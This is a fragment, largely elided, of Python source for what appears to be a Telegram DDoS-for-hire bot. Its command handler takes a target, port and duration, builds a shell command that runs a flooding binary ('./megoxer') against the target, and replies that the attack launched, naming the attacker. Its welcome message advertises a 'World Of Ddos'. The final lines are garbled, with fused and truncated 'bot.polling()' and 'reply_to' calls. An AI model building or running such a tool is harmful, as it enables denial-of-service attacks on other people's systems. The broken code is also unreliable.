...
def start_attack_reply(message, target, port, time):
    ...
    response = f"🚀 Aᴛᴛᴀᴄᴋ Lᴀᴜɴᴄʜᴇᴅ Sᴜᴄᴄᴇsssғᴜʟʟʏ! 🚀\n\nTᴀʀɢᴇᴛ: {target}\nDᴜʀᴀᴛɪᴏɴ: {time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: @{username}"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 180:
                ...
                full_command = f"./megoxer {target} {port} {time} 877"
...
def welcome_start(message):
    ...
    response = f"🔆 Wᴇʟᴄᴏᴍᴇ Tᴏ Wᴏʀʟᴅ Oғ Dᴅᴏs Mᴀᴅᴇ Bʏ @SIDIKI_MUSTAFA_47 🔆"
    bot.reply_to(message, response)
...
bot.polling()reply_to(message, response)
...
bot.polling()eply_to(message, response)
